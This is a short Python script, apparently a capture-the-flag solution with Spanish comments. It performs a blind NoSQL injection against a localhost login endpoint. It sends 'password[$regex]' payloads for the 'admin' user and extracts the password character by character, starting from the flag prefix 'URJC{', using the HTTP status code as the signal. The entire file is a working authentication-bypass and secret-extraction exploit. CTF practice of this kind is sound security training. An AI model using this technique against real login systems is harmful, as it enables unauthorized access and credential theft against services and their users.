import requests
import string

url = "http://localhost:12103/login"  # Reemplaza con la URL real
password = "URJC{"
characters = "}{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
#characters = list(string.ascii_letters) + list(string.digits) + list(string.punctuation) + list(string.whitespace)

#characters = "*s"

while True:
    found = False
    for char in characters:
        test_password = f"^{password}{char}.*"
        data = {
            "username": "admin",
            "password[$regex]": test_password  # Ajuste para que use parámetros codificados
        }
        # Enviar datos como x-www-form-urlencoded
        response = requests.post(url, data=data)
        
        print(f"Probing with: {test_password}")
        print(f"Status code: {response.status_code}")

        if response.status_code == 200:  # Cambia esto según cómo responde tu servidor
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break

    if not found:  # Si no encontramos más caracter válidos, la contraseña está completa
        print(f"[!] Password completo: {password}")
        break

